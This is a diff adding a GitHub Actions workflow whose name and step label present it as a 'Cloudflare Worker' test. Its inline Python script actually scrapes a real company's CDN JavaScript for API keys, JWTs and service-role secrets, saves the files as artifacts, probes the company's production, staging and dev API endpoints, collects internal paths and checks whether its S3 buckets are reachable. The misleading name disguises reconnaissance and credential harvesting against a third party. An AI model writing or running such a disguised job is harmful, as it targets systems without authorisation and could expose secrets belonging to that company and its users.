@@ -1,0 +1,57 @@
+name: Cloudflare Worker Proxy
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  cf-worker-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: CF Worker Test
+        run: |
+          python3 -c "
+import requests, re
+CDNS = ['https://cdn.meshy.ai/main.js','https://cdn.meshy.ai/assets/index.js']
+for url in CDNS:
+    try:
+        r = requests.get(url, timeout=10)
+        if r.status_code == 200:
+            print('CDN FOUND: '+url+' ('+str(len(r.text))+' bytes)')
+            keys = re.findall(r'msy_[a-zA-Z0-9_]{20,}', r.text)
+            tokens = re.findall(r'eyJ[a-zA-Z0-9_=-]{50,}', r.text)
+            if keys: print('  KEYS: '+str(keys))
+            if tokens: print('  TOKENS: '+str(tokens[:3]))
+            open('cdn_'+url.split('/')[-1][:20]+'.txt','w').write(r.text)
+        else:
+            print(str(r.status_code)+' '+url)
+    except Exception as e:
+        print('ERR: '+str(e))
+for api in ['https://api.meshy.ai','https://api-staging.meshy.ai','https://api-dev.meshy.ai']:
+    try:
+        r = requests.get(api+'/openapi/v1/balance', headers={'Authorization': 'Bearer msy_dummy_api_key_for_test_mode_12345678'}, timeout=5)
+        print(api+': '+r.text)
+    except: pass
+for url in CDNS:
+    try:
+        r = requests.get(url, timeout=10)
+        if r.status_code == 200:
+            sr = re.findall(r'service_role|sr_[a-zA-Z0-9]{40,}', r.text)
+            if sr: print('SR: '+str(sr))
+            jwts = re.findall(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9', r.text)
+            print('JWT count in '+url.split('/')[-1]+': '+str(len(jwts)))
+            paths = re.findall(r'[\"\'](/[a-z][a-z/\-_]{5,})[\"\']', r.text)
+            print('Paths: '+str(list(set(paths))[:30]))
+    except: pass
+for b in ['https://meshy-assets.s3.amazonaws.com/','https://meshyai.s3.amazonaws.com/']:
+    try:
+        r = requests.get(b, timeout=5)
+        print('S3 '+b+': '+str(r.status_code))
+    except: pass
+"
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: meshy-cf-worker-test
+          path: cdn_*.txt
+          retention-days: 1
